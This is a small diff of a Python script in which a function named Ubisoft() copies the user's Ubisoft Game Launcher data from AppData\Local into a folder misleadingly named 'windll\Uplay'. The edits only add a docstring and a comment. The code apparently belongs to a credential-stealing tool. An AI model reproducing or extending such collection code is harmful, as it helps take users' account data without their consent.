@@ -12,6 +12,9 @@
 
 import os
 import shutil
+"""
+all needed paths
+"""
 path = r"\Ubisoft Game Launcher"
 
 def Ubisoft():
@@ -19,6 +22,6 @@ def Ubisoft():
         pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
         #os.makedirs(rf'{pathtofile}\windll\Uplay')
         user = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        shutil.copytree(user+ os.sep + path,rf'{pathtofile}\windll\Uplay')
+        shutil.copytree(user+ os.sep + path,rf'{pathtofile}\windll\Uplay')# copy dir
     except Exception as e:
         print(e)
